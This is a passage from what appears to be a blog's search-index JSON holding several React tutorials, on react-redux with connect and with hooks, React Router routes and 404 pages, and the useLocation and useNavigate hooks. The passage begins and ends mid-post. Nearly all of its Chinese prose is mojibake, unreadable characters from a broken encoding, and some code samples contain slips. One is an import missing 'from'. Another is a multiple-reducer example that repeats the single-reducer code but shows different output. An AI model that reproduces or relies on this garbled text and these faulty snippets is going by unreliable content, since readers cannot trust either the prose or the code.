useDispatch èƒ½ç”¨äº†ï¼Œé‚£åŸæœ¬çš„ Component è¦æ€éº¼ dispatch ä¸€å€‹ actionï¼Ÿã€ å‰›å‰›ä¸æ˜¯æœ‰èªªå¯ä»¥å‚³ props å—ï¼Ÿæ‰€ä»¥åªè¦å…ˆåœ¨å¤–é¢é€™ä¸€å±¤æŠŠ dispatch å¯«å¥½å¾Œåœ¨ç•¶ä½œ props å‚³é€²å»å°±å¥½å•¦ï¼Œé€™å°±æ˜¯é€™ä¸€æ®µåœ¨åšçš„äº‹æƒ…ã€‚ é †é“ä¸€æï¼Œé€™é‚Šå¦‚æœ props è·Ÿ dispatch çš„ action åŒåï¼Œå¯ä»¥ç”¨é€™æ¨£ä¾†ç¸®å¯«ï¼š 123const mapDispatchToProps = { addTodo} åšå¥½ä»¥å¾Œï¼Œæœ€å¾Œä¸€æ­¥å°±æ˜¯æŠŠ container/ åº•ä¸‹çš„ Component å¼•å…¥ä½¿ç”¨è€Œå·²ã€‚å› ç‚º code æœ‰é»å¤šæˆ‘å°±ä¸è²¼é€™é‚Šäº†ï¼Œæƒ³çœ‹å®Œæ•´çš„åŸå§‹ç¢¼åˆ°é€™é‚Šä¾†çœ‹ã€‚ æœ€å¾Œåªæ˜¯æƒ³æä¸€ä¸‹ï¼Œé€™æ¨£å­çš„åšæ³•æœ‰ä»€éº¼å¥½è™•å—ï¼Ÿ æœ‰å“¦ï¼å¥½è™•æ˜¯ã€Œæ¸¬è©¦ã€æ¯”è¼ƒå¥½æ¸¬ï¼Œå› ç‚ºæŠŠ Component éƒ½æ‹†æˆæ›´å°çš„å–®ä½äº†ï¼Œè€Œä¸”æ¯å€‹ Component çš„è·è²¬æ›´åŠ åˆ†æ˜ï¼ˆè² è²¬ UI / è² è²¬ Reduxï¼‰ï¼Œæ‰€ä»¥æœƒè¦æ¸¬è©¦çš„é …ç›®æœƒå–®ç´”è¨±å¤šã€‚","link":"/2022/04/24/react-redux-by-connect/"},{"title":"ç”¨ react-redux æŠŠ redux è·Ÿ React ä¸²æ¥èµ·ä¾†ï¼ˆHooks ç‰ˆæœ¬ï¼‰","text":"ä¸€å€‹æœ€å¸¸è¦‹çš„ä½œæ³•ã€‚ ç°¡è¿°é›–ç„¶èªªä½ ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹å‹•æŠŠ Redux è·Ÿ React çµ¦ä¸²èµ·ä¾†ï¼Œä½†é€éå¥—ä»¶ä¾†è™•ç†æœƒæ›´å¥½ã€‚é€™é‚Šæœƒä»‹ç´¹ä¸€å¥—å«åš react-redux çš„ libraryï¼Œç”¨å®ƒä¾†æŠŠ React è·Ÿ Redux ä¸²æ¥èµ·ä¾†ã€‚ è¨˜å¾—ï¼Œredux è·Ÿ react-redux æ˜¯ä¸åŒçš„æ±è¥¿ï¼š Redux æ˜¯ç®¡ç†ç‹€æ…‹çš„ library react-redux æ˜¯ç”¨ä¾†æŠŠ React è·Ÿ redux çµåˆèµ·ä¾†çš„ library ä¸è¦å†ææ··å•¦ï¼ è¦ç”¨ react-redux çš„æ–¹å¼ æœ‰å…©ç¨®ï¼Œä¸€ç¨®æ˜¯å»ºç«‹ create-react-app æ™‚åŠ ä¸Šåƒæ•¸ï¼š 1npx create-react-app my-app --template redux ä¸€ç¨®æ˜¯å°ç¾æœ‰çš„ create-react-app ä¾†åŠ ä¸Š react-reduxï¼š 12npm install redux npm install react-redux æˆ‘å€‘è¦ä»‹ç´¹çš„æ˜¯ç¬¬äºŒç¨®ã€‚ åŸºæœ¬çš„è³‡æ–™å¤¾çµæ§‹åœ¨ä¸²æ¥ä¹‹å‰è¨˜å¾—å…ˆåšå¥½ redux å‰ç½®ä½œæ¥­ï¼Œä½ çš„è³‡æ–™å¤¾çµæ§‹æ‡‰è©²æœƒé•·æˆé€™æ¨£ï¼š redux reducers todos.js users.js index.js ï¼ˆæŠŠæ‰€æœ‰ reducer é›†åˆèµ·ä¾†ï¼‰ store.jsï¼ˆè² è²¬å»ºç«‹ storeï¼‰ actionTypes.jsï¼ˆæŠŠ action type çš„å¸¸æ•¸é›†åˆèµ·ä¾†ï¼‰ actionsï¼ˆaction creator ç®¡ç†ï¼‰ selectorsï¼ˆæŠŠé¸å‡º state çš„ function é›†åˆèµ·ä¾†ï¼‰ é€™é‚Šåˆ—å‡ºæˆ‘è¦ºå¾—éœ€è¦çŸ¥é“ä¸€ä¸‹å…§å®¹çš„å¹¾å€‹æª”æ¡ˆï¼š 1. reducers/index.js 123456789import { combineReducers } from \"redux\";import todosReducer from \"./todos\"import usersReducer from \"./users\"// æŠŠè¦ export å‡ºå»çš„ reducer å‚³é€²å»export default combineReducers({ todosReducer, usersReducer}) é€™é‚Šå› ç‚ºæ˜¯ã€Œå¤šå€‹ã€reducerï¼Œæ‰€ä»¥è³‡æ–™çµæ§‹æœƒè·Ÿåªæœ‰ã€Œå–®ä¸€å€‹ã€çš„æ™‚å€™ä¸å¤ªä¸€æ¨£ï¼Œè¦å¤šæ³¨æ„ä¸€ä¸‹ã€‚ å–®ä¸€å€‹çš„æ™‚å€™ï¼š 12const store = createStore(todosReducer);console.log(store.getState()); outputï¼š 123{ todos: ['todo1', 'todo2', 'todo3']} å¤šå€‹çš„æ™‚å€™ï¼š 12const store = createStore(todosReducer);console.log(store.getState()); outputï¼š 12345678{ todosReducer: { todos: ['todo1', 'todo2'] }, usersReducer: { users: ['user1', 'user2'] }} 2. redux/store.js 12345import { createStore } from \"redux\";import rootReducer from \"./reducers\";// æŠŠ reducer ä¸Ÿé€²å» create ä¸€å€‹ storeexport default createStore(rootReducer); 3. redux/selectors.js é€™é‚Šåšå€‹è£œå……ï¼Œselector çš„ç”¨é€”åªæ˜¯ã€ŒæŠŠæˆ‘æƒ³è¦çš„ state é¸å‡ºä¾†ã€è€Œå·²ï¼Œç•¢ç«Ÿä½ æ‡‰è©²ä¸æœƒæƒ³åœ¨ä¸€å€‹ Component è£¡é¢æ‹¿åˆ°æ‰€æœ‰çš„ stateï¼Œæ‰€ä»¥æ‰æœƒè¡ä¼¸å‡ºé€™å€‹æ±è¥¿ã€‚ å¦å¤–ä¹‹æ‰€ä»¥æœƒæŠ½å‡ºå»å»ºç«‹æˆ constant åªæ˜¯å› ç‚º code å¯«èµ·ä¾†æœƒæ¯”è¼ƒç°¡æ½”è€Œå·²ã€‚ 123// å…©å€‹ functionexport const selectTodos = state =&gt; state.todosReducer.todos;export const selectUsers = state =&gt; state.usersReducer.users; å…¶ä»–çš„å°±åªæ˜¯æŠŠåŸæœ¬çš„æ±è¥¿æŠ½å‡ºå»å¯«æˆä¸€å€‹æª”æ¡ˆè€Œå·²ï¼Œå¿˜è¨˜çš„è©±å¯ä»¥åƒè€ƒï¼šåˆæ¢ Redux æ­£å¼ä¸²æ¥é€™é‚Šå¯«å€‹æ‡¶äººåŒ…ï¼š å®šç¾© Provider æŠŠ store å‚³å…¥ Providerï¼Œè®“åº•ä¸‹æ‰€æœ‰å…ƒä»¶èƒ½å¤ æ¥æ”¶ åœ¨å…ƒä»¶å…§ä½¿ç”¨ useSelector å–å‡ºéœ€è¦çš„ stateï¼ˆæ­é…å‰é¢å¯«å¥½çš„ selectors.jsï¼‰ å…ˆå¼•å…¥ useDispatchï¼Œæ¥è‘—å°±èƒ½é€é dispatch ç™¼å‡º action é€™é‚Šç›´æ¥é™„ä¸Š codeï¼Œä½ é‚Šçœ‹é‚Šæƒ³ä¸€ä¸‹æ‡‰è©²å°±æ‡‚äº†ï¼š 12345678910// index.jsimport { Provider } from \"react-redux\";import store from \"./redux/store\"const root = ReactDOM.createRoot(document.getElementById(\"root\"));root.render( &lt;Provider store={store}&gt; &lt;App /&gt; &lt;/Provider&gt;); 123456789101112131415161718192021222324252627282930313233// App.jsimport { useState, useEffect } from \"react\";import { useSelector, useDispatch } from \"react-redux\";import { selectTodos } from \"./redux/selectors\"import { addTodo } from \"./redux/actions\"function App() { const [value, setValue] = useState(\"\"); // ç”¨ useSelector æŠŠ todos çš„ state æ‹¿å‡ºä¾† const todos = useSelector(selectTodos); // å®šç¾©ç”¨ä¾†ç™¼å‡º dispatch çš„ function const dispatch = useDispatch(); // è¡¨å–® submit å¾Œ disptch æ–°å¢ todo çš„ action const handleSubmit = e =&gt; { e.preventDefault(); dispatch(addTodo(value)); setValue(\"\") } return ( &lt;div className=\"App\"&gt; &lt;form onSubmit={handleSubmit}&gt; &lt;input value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;/form&gt; &lt;ul&gt; {todos.map(todo =&gt; &lt;li key={todo.id} data-id={todo.id} &gt;{todo.name}&lt;/li&gt;)} &lt;/ul&gt; &lt;/div&gt; );}export default App; é€™æ¨£å­å…¶å¯¦å°±ä¸²å¥½å›‰ï¼æœ‰ç–‘å•çš„è©±ä¹Ÿå¯ä»¥å»æˆ‘å¯«çš„ ç¯„ä¾‹ åƒè€ƒã€‚","link":"/2022/04/24/react-redux-by-hooks/"},{"title":"React åŸºæœ¬çš„è·¯ç”±çµæ§‹","text":"ç¹¼ Vue ä»¥å¾Œçš„ç¬¬äºŒå€‹å‰ç«¯è·¯ç”±ã€‚ ç°¡è¿°å…ˆä¾†çœ‹ä¸€ä¸‹çµæ§‹é•·æ€æ¨£ï¼š 1234567891011121314151617181920// Router æœ‰åˆ†æˆ HashRouter / BrowserRouter// é€™å€‹ç•™åˆ°ä¸‹é¢å†åšèªªæ˜import { HashRouter as Router, Routes, Route, Link } from \"react-router-dom\";&lt;Router&gt; &lt;Link to=\"/\"&gt;home&lt;/Link&gt; &lt;Link to=\"/about\"&gt;about&lt;/Link&gt; &lt;Link to=\"/categories\"&gt;categories&lt;/Link&gt; &lt;Link to=\"/posts\"&gt;posts&lt;/Link&gt; &lt;Link to=\"/log-in\"&gt;log in&lt;/Link&gt; &lt;Link to=\"//sign-up\"&gt;/sign up&lt;/Link&gt; &lt;Routes&gt; &lt;Route path=\"/\" element={&lt;HomePage /&gt;} /&gt; &lt;Route path=\"/about\" element={&lt;AboutPage /&gt;} /&gt; &lt;Route path=\"/categories\" element={&lt;CategoriesPage /&gt;} /&gt; &lt;Route path=\"/posts\" element={&lt;PostsPage /&gt;} /&gt; &lt;Route path=\"/posts/:id\" element={&lt;SinglePostPage /&gt;} /&gt; &lt;Route path=\"/log-in\" element={&lt;LoginPage /&gt;} /&gt; &lt;Route path=\"/sign-up\" element={&lt;SignUpPage /&gt;} /&gt; &lt;/Routes&gt;&lt;/Router&gt; &lt;Router&gt; é€™é‚Šæ˜¯ç”¨ä¾†ç®¡ç†è·¯ç”±çš„å…ƒä»¶ï¼Œè«‹å‹™å¿…æŠŠæ‰€æœ‰å…§å®¹éƒ½æ”¾åœ¨é€™è£¡é¢ã€‚ &lt;Link&gt; å…¶å¯¦å°±æ˜¯ &lt;a&gt;ï¼Œç”¨ä¾†è¨­å®šé»ä¸‹æ™‚è©²è·³è½‰åˆ°å“ªå€‹é é¢ &lt;Routes&gt; ç”¨ä¾†åŒ¹é…è·¯ç”±çš„å…ƒä»¶ï¼Œåœ¨ V6 ä¹‹å‰å«åš &lt;Switch&gt; &lt;Route path=\"...\" element=\"...\"&gt; ç”¨ä¾†è¨­å®šä¸åŒè·¯ç”±è¦é¡¯ç¤ºå“ªå€‹ Componentã€‚ åŸºæœ¬çµæ§‹å¤§è‡´å°±æ˜¯é€™æ¨£ï¼æ¥ä¸‹ä¾†æœƒè¬›ä¸€äº›è£œå……å…§å®¹ã€‚ Router çš„ç¨®é¡ï¼ŒHashRouter èˆ‡ BrowserRouterRouter å…¶å¯¦æœ‰å…©ç¨®é¸æ“‡ï¼š 1234// æœ‰ hashimport { HashRouter as Router } from \"react-router-dom\"// æ²’æœ‰ hashï¼ˆç”¨ History API å¯¦ç¾ï¼‰import { BrowserRouter as Router } from \"react-router-dom\" é€™å…©å€‹å·®åœ¨å¦‚æœæ˜¯ hash mode çš„è©±ï¼Œå° server è€Œè¨€ä½ éƒ½æ˜¯åœ¨è«‹æ±‚åŒä¸€å€‹æª”æ¡ˆï¼Œå› æ­¤ä¸æœƒ 404ã€‚ 123ä¸ç®¡æ˜¯å“ªä¸€å€‹ï¼Œä½ æ°¸é éƒ½æ˜¯åœ¨å° example.com ç™¼å‡º requesthttps://example.com/#/homehttps://example.com/#/about ä½†å¦‚æœæ˜¯ History APIï¼Œserver å°±æœƒèªç‚ºä½ æ˜¯åœ¨æ‰¾ä¸åŒçš„æª”æ¡ˆï¼Œæ‰€ä»¥æ‰¾ä¸åˆ°å°æ‡‰è³‡æºæ™‚å°±æœƒå›å‚³ 404ã€‚ 123ç€è¦½å™¨åˆ†è¾¨ä¸å‡ºä¾†ï¼Œæ‰€ä»¥æœƒç›´æ¥ç™¼å‡º requesthttps://example.com/homehttps://example.com/about ç¸½è€Œè¨€ä¹‹ï¼Œå¦‚æœå¸Œæœ›ç¶²å€ä¸è¦å‡ºç¾ #ï¼Œå°±å¾—åˆ° server è¨­å®šä¸€äº›æ±è¥¿ï¼Œè®“æ¯å€‹è·¯ç”±éƒ½ä¸€å¾‹å°å‘ index.htmlï¼Œé€™æ¨£å°±ä¸æœƒå‡ºç¾ 404 çš„å•é¡Œäº†ã€‚ä½†å¦‚æœä½ å¾ˆæ‡¶å¾—èª¿çš„è©±å°±ç”¨ hash mode å§ï¼ å‹•æ…‹è·¯ç”±æœ‰äº›æ™‚å€™è·¯ç”±æ˜¯å‹•æ…‹ç”¢ç”Ÿçš„ï¼Œåƒ /posts/1 posts/2 é€™ç¨®å¾Œé¢çš„æ•¸å­—ä¸æ˜¯å›ºå®šçš„ï¼Œå°±æœƒç”¨åˆ°ã€‚ è¨­å®šæ–¹å¼ä¹Ÿå¾ˆç°¡å–®ï¼Œå°±è·Ÿ Express çš„å¯«æ³•å·®ä¸å¤šï¼š 1234567&lt;Router&gt; &lt;NavBar /&gt; &lt;Routes&gt; {/* å¸Œæœ›æ¥æ”¶çš„åƒæ•¸ */} &lt;Route path=\"/posts/:id\" element={&lt;SinglePostPage /&gt;} /&gt; &lt;/Routes&gt;&lt;/Router&gt; æ¥è‘—åœ¨ &lt;SinglePostPage /&gt; å°±å¯ä»¥é€é useParams ä¾†å–å¾—åƒæ•¸å€¼ï¼š 12345export default function SinglePostPage() { // è§£æ§‹æ‹¿å‡ºä¾† const { id } = useParams(); console.log('id:', id);}","link":"/2022/04/12/react-router-basic/"},{"title":"React router dom ç›¸é—œçš„ hook","text":"ä¸€æ­¥ä¸€æ­¥ç´¯ç©ã€‚ ç°¡è¿°é›–ç„¶ç›®å‰æ¥è§¸çš„é‚„ä¸å¤šï¼Œä½†å¦‚æœä¹‹å¾Œæœ‰æ©Ÿæœƒçš„è©±æœƒæ…¢æ…¢æŠŠä¸€äº›æˆ‘è¦ºå¾—ä¸éŒ¯ç”¨çš„ hook çµ¦è£œä¸Šä¾†ã€‚ useLocationç°¡å–®ä¾†èªªå°±æ˜¯æœƒæä¾›ä½ è·Ÿã€Œç¶²å€ã€ç›¸é—œçš„è³‡è¨Šï¼Œå…§å®¹æœƒé•·é€™æ¨£ï¼š 1234567{ \"pathname\": \"/search\", \"search\": \"\", \"hash\": \"\", \"state\": null, \"key\": \"oaeqgk1p\"} é‹ç”¨é€™å€‹æ±è¥¿å¯ä»¥ä¾†å¯¦ç¾å°è¦½åˆ— active çš„ç‹€æ…‹ï¼Œå‡è¨­æˆ‘æœ‰ä¸€å€‹ &lt;Nav /&gt; å…§å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728import React, { useEffect } from \"react\";import { Link } from \"react-router-dom\";const Nav: React.FC = () =&gt; { useEffect(() =&gt; { console.log(\"path\", location.pathname); }, [location.pathname]); return ( &lt;ul&gt; &lt;li&gt; &lt;Link to=\"\"&gt;Home&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"about\"&gt;About&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"products\"&gt;Products&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"search\"&gt;Search&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; );};export default Nav; æˆ‘å¸Œæœ›ç•¶æˆ‘åœ¨ \"\" çš„é é¢æ™‚ï¼Œ&lt;Link /&gt; æ™‚åŠ ä¸Š active çš„ classNameï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯ä»¥æ­¤é¡æ¨ï¼Œé‚£æˆ‘å°±å¯ä»¥åˆ©ç”¨ location ä¾†åšé€™ä»¶äº‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import React, { useEffect } from \"react\";import { Link, useLocation } from \"react-router-dom\";const Nav: React.FC = () =&gt; { const location = useLocation(); useEffect(() =&gt; { console.log(\"path\", location.pathname); }, [location.pathname]); return ( &lt;ul&gt; &lt;li&gt; &lt;Link to=\"\" className={location.pathname === \"/\" ? \"active\" : \"\"}&gt; Home &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"about\" className={location.pathname === \"/about\" ? \"active\" : \"\"} &gt; About &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"products\" className={location.pathname === \"/products\" ? \"active\" : \"\"} &gt; Products &lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"search\" className={location.pathname === \"/search\" ? \"active\" : \"\"} &gt; Search &lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; );};export default Nav; é€™æ¨£å­å°±èƒ½å¯¦ç¾å›‰ï¼ é›–ç„¶é€™æ‡‰è©²ä¸æ˜¯æœ€å¥½çš„åšæ³•ï¼Œç•¢ç«Ÿæœ‰é» hard codeã€‚ä½†ä¸»è¦æ˜¯æƒ³ä»‹ç´¹ useLocation é€™å€‹ hook è€Œå·²ã€‚ æœ€å¾Œä¸€æ¨£é™„ä¸Šç¯„ä¾‹ã€‚ useNavigate ä¹‹ replace çš„ä½œç”¨useNavigate æœ€å¸¸è¦‹çš„ç”¨é€”æ˜¯æ‹¿ä¾†è·³è½‰é é¢ï¼Œé€™å€‹å¤§å®¶æ‡‰è©²éƒ½çŸ¥é“ï¼Œæ‰€ä»¥é€™é‚Šå°±ä¸ä»‹ç´¹äº†ã€‚é€™é‚Šè¦ä»‹ç´¹çš„æ˜¯ replace é€™å€‹å¯é¸åƒæ•¸çš„ç”¨é€”ã€‚ å‡è¨­æˆ‘æœ‰ä¸€å€‹ç¶²ç«™ï¼Œç™»å…¥å¾Œæ‰èƒ½é€²åˆ°é¦–é ï¼Œé‚£æˆ‘å¯èƒ½å°±æœƒåœ¨æäº¤è¡¨å–®çš„æ™‚å€™ç”¨ useNavigate ä¾†è™•ç†ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829import React from \"react\";import { useNavigate } from \"react-router-dom\";const Login: React.FC = () =&gt; { const navigate = useNavigate(); const handleSubmit = (e: React.FormEvent&lt;HTMLFormElement&gt;) =&gt; { e.preventDefault(); // é€å‡ºè¡¨å–®å¾Œå°å‘é¦–é  navigate(\"/home\"); }; return ( &lt;div&gt; &lt;h2&gt;Login&lt;/h2&gt; &lt;form onSubmit={handleSubmit}&gt; &lt;div&gt; username: &lt;input type=\"text\" /&gt; &lt;/div&gt; &lt;div&gt; password: &lt;input type=\"password\" /&gt; &lt;/div&gt; &lt;button&gt;submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; );};export default Login; å¯æ˜¯é€™æ¨£æœƒæœ‰ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯æˆ‘å¯ä»¥æŒ‰ã€Œä¸Šä¸€é ã€ä¾†å›åˆ°ç™»å…¥ç•«é¢ï¼š ï¼ˆå¾Œä¾†è¦è£œåœ–æ™‚å»åšä¸å‡ºé€™æ•ˆæœâ€¦ï¼Œç¸½ä¹‹ç¢ºå¯¦æ˜¯èƒ½å›åˆ°ä¸Šä¸€é çš„ï¼‰ å¾ˆè©­ç•°å§ï¼Ÿæ‰€ä»¥ replace å°±æ˜¯é€™æ¨£ç”¨çš„ï¼Œåªè¦æ”¹å¯«æˆé€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829import React from \"react\";import { useNavigate } from \"react-router-dom\";const Login: React.FC = () =&gt; { const navigate = useNavigate(); const handleSubmit = (e: React.FormEvent&lt;HTMLFormElement&gt;) =&gt; { e.preventDefault(); // åŠ ä¸Š replace: true navigate(\"/home\", { replace: true }); }; return ( &lt;div&gt; &lt;h2&gt;Login&lt;/h2&gt; &lt;form onSubmit={handleSubmit}&gt; &lt;div&gt; username: &lt;input type=\"text\" /&gt; &lt;/div&gt; &lt;div&gt; password: &lt;input type=\"password\" /&gt; &lt;/div&gt; &lt;button&gt;submit&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; );};export default Login; é€™æ¨£å°±æ²’è¾¦æ³•å›åˆ°ä¸Šä¸€é å•¦ï¼ é †é“ä¸€æï¼Œå¦‚æœä½ æ˜¯ç”¨ &lt;Link /&gt; ä¾†è·³è½‰çš„è©±ï¼Œå®ƒä¹Ÿæœ‰ replace é€™å€‹å±¬æ€§å¯ä»¥ç”¨ï¼ŒåŠŸèƒ½æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼š 12345678910111213141516import React from \"react\";import { Link } from \"react-router-dom\";const Home: React.FC = () =&gt; { return ( &lt;div&gt; &lt;h2&gt;Welcome come back!&lt;/h2&gt; &lt;p&gt;Let's see some thing new.&lt;/p&gt; &lt;Link to=\"../\" replace={true}&gt; back &lt;/Link&gt; &lt;/div&gt; );};export default Home; æœ€å¾Œï¼Œæƒ³çœ‹ç¯„ä¾‹çš„è©±å¯ä»¥åˆ°é€™é‚Šä¾†çœ‹ã€‚","link":"/2022/05/14/react-router-dom-hook/"},{"title":"é‡æº« React router dom","text":"æ„Ÿè¦ºé€™ç¯‡æ–‡ç‰¹åˆ¥é•·ã€‚ ç°¡è¿°é›–ç„¶ä»¥å‰æœ‰å­¸é React router domï¼Œä¹Ÿæœ‰å¯¦éš›ç”¨éçš„ç¶“é©—ï¼Œä½†æ„Ÿè¦ºè‡ªå·±å°æœ‰äº›æ±è¥¿é‚„æ˜¯ä¸å¤ ç†Ÿï¼Œæ‰€ä»¥ä»Šå¤©å°±ä¾†é‡æº«é€™å€‹ä¸»é¡Œã€‚ Routerã€Routesã€Routeï¼Œä½ å€‘åˆ°åº•å·®åœ¨å“ªï¼Ÿå…ˆè®“æˆ‘å€‘çœ‹ä¸€æ®µ code å†ä¾†è§£é‡‹ï¼š 1234567891011121314151617181920import React from 'react';import Home from \"./Home\";import About \"./About\";import Profile from \"./Profile\";import { HashRouter as Router, Routes, Route } from \"react-router-dom\"export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;a href='/home'&gt;Show in every page&lt;/a&gt; &lt;Routes&gt; &lt;Route path=\"/\" element={&lt;Home /&gt;}&gt;&lt;/Route&gt; &lt;Route path=\"/about\" element={&lt;About /&gt;}&gt;&lt;/Route&gt; &lt;Route path=\"/profile\" element={&lt;Profile /&gt;}&gt;&lt;/Route&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App; é¦–å…ˆ Router å…¶å¯¦æ˜¯ BrowserRouter çš„ HashRouter çš„åˆ¥åï¼Œå› ç‚ºåŸåå¤ªé•·äº†æ‰æœƒæ”¹ç”¨é€™å€‹åå­—ä¾†ä»£è¡¨ã€‚ è‡³æ–¼ BrowserRouter çš„ HashRouter çš„æœ€ä¸»è¦çš„å·®ç•°åœ¨æ–¼ç¶²å€æœƒä¸æœƒæœ‰ # ï¼ŒçŸ¥é“é€™æ¨£å°±å¤ äº†ã€‚ è‡³æ–¼ Routers è·Ÿ Route çš„å·®åˆ¥é¡¯è€Œæ˜“è¦‹ï¼ŒRouters æ˜¯ç”¨ä¾†æŠŠæ‰€æœ‰è·¯ç”±çµ¦åŒ…ä½çš„ï¼ˆæ³¨æ„å­—å°¾çš„ sï¼‰ï¼Œè€Œ Route å‰‡æ˜¯ç”¨ä¾†é¡¯ç¤ºå“ªå€‹ç¶²å€è¦é¡¯ç¤ºå“ªå€‹ Componentã€‚ å¦å¤–é€™å€‹ä¾‹å­è£¡é‚„ç‰¹æ„æ”¾äº†ä¸€å€‹ &lt;a&gt; åœ¨ Routes å¤–é¢ï¼Œå…¶å¯¦æ˜¯æƒ³é †ä¾¿èªªä¸€ä»¶äº‹æƒ…ï¼Œå°±æ˜¯åƒå°è¦½åˆ—é€™ç¨®æ¯ä¸€å€‹é é¢éƒ½æœƒç”¨åˆ°çš„ Componentï¼Œæˆ‘å€‘å°±ä¸æœƒæŠŠå®ƒæ”¾åœ¨ Routes è£¡ã€‚ åŸºæœ¬çµæ§‹èˆ‡ 404 é é¢12345678910111213141516171819import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import About from './pages/About'import Home from './pages/Home'import Profile from './pages/Profile'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Routes&gt; &lt;Route path='/' element={&lt;Home /&gt;} /&gt; &lt;Route path='/about' element={&lt;About /&gt;} /&gt; &lt;Route path='/profile' element={&lt;Profile /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App å°±è·Ÿä¸€é–‹å§‹çš„ç¯„ä¾‹ä¸€æ¨£ï¼Œæˆ‘å€‘æœƒåœ¨ Route é€é path å’Œ element ä¾†æŒ‡å®šã€Œå“ªå€‹è·¯ç”±é¡¯ç¤ºå“ªå€‹ Componentã€ã€‚ ä½†å¦‚æœæˆ‘å€‘æƒ³è¦æœ‰å€‹ 404 é é¢æ€éº¼è¾¦ï¼Ÿå¯ä»¥é€™æ¨£åšï¼š 123456789101112131415161718192021import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import About from './pages/About'import ErrorPage from './pages/ErrorPage'import Home from './pages/Home'import Profile from './pages/Profile'export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Routes&gt; &lt;Route path='/' element={&lt;Home /&gt;} /&gt; &lt;Route path='/about' element={&lt;About /&gt;} /&gt; &lt;Route path='/profile' element={&lt;Profile /&gt;} /&gt; &lt;Route path='*' element={&lt;ErrorPage /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )}export default App é€™é‚Šçš„æŠ€å·§æ˜¯æŠŠ path æŒ‡å®šç‚º * ä¸¦ä¸”æ”¾åœ¨æœ€ä¸‹é¢ï¼ˆä¸€å®šè¦é€™æ¨£å­ï¼‰ã€‚ ç‚ºä»€éº¼è¦é€™æ¨£åšï¼Ÿå› ç‚ºåªæœ‰ç•¶ä¸Šé¢éƒ½åŒ¹é…ä¸åˆ°æ™‚æ‰æœƒå¥—ç”¨æœ€å¾Œä¸€å€‹ï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦æŠŠå®ƒå°æ‡‰åˆ° 404 çš„ Component å°±å¥½å›‰ã€‚ åˆ‡æ›è·¯ç”±åˆ‡æ›è·¯ç”±ä¸»è¦æœ‰å…©ç¨®æ–¹å¼ï¼Œä¸€ç¨®æ˜¯é€é Linkï¼ˆreact-router-dom æä¾›çš„å…ƒä»¶ï¼‰ï¼Œå¦ä¸€ç¨®æ˜¯é€é useNavigateã€‚ é€™é‚Šå…ˆä¾†çœ‹ Link çš„åšæ³•ï¼Œé¦–å…ˆè¦å…ˆå»ºç«‹ä¸€å€‹ Nav å…ƒä»¶ä¾†ç•¶ä½œå°è¦½åˆ—ï¼š 1234567891011121314151617181920import React from 'react'import { Link } from 'react-router-dom'const Nav: React.FC = () =&gt; { return ( &lt;ul&gt; &lt;li&gt; &lt;Link to='/'&gt;Home&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='/about'&gt;About&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to='/profile'&gt;Profile&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; )}export default Nav &lt;Link&gt; çš„æœ¬é«”å°±æ˜¯ &lt;a&gt; è€Œå·²ï¼Œæ‰€ä»¥ä½ ä¹Ÿå¯ä»¥ç”¨ &lt;a&gt; ä¾†å–ä»£ã€‚ä½†é€šå¸¸æœƒå»ºè­°ç”¨ &lt;Link&gt;ï¼Œå› ç‚ºå¦‚æœç”¨çš„æ˜¯ HashRouter å°±ä¸èƒ½åƒä¸Šé¢ä¸€æ¨£åªå¯« /aboutï¼Œè€Œæ˜¯å¾—è‡ªå·±åŠ ä¸Š #ã€‚ æ¥è‘—å†æŠŠ Nav æ”¾åˆ°ä¸»é é¢ä¸­å°±è¡Œå›‰ï¼š 12345678910111213141516171819202122import React from 'react'import { HashRouter as Router, Routes, Route } from 'react-router-dom'import About from './pages/About'import ErrorPage from './pages/ErrorPage'import Home from './pages/Home'import Profile from './pages/Profile'import Nav from './pages/Nav'// å› ç‚ºæ‰€æœ‰é é¢éƒ½æœƒå‡ºç¾ï¼Œæ‰€ä»¥æœƒæ”¾åœ¨ Routes å¤–é¢export const App: React.FC = () =&gt; { return ( &lt;Router&gt; &lt;Nav /&gt; &lt;Routes&gt; &lt;Route path='/' element={&lt;Home /&gt;} /&gt; &lt;Route path='/about' element={&lt;About /&gt;} /&gt; &lt;Route path='/profile' element={&lt;Profile /&gt;} /&gt; &lt;Route path='*' element={&lt;ErrorPage /&gt;} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )} æ¥è‘—æ˜¯ç¬¬äºŒç¨®åšæ³•ï¼Œç”¨ useNavigateã€‚é€™å€‹å¯èƒ½æœƒç”¨åœ¨å¡«å®Œè¡¨å–®æ™‚è¦è·³è½‰æ™‚çš„æƒ…å¢ƒï¼Œæ›å¥è©±èªªå°±æ˜¯é€é JS ä¾†åšåˆ‡æ›ï¼š 12345678910111213141516import React from 'react'import { useNavigate } from 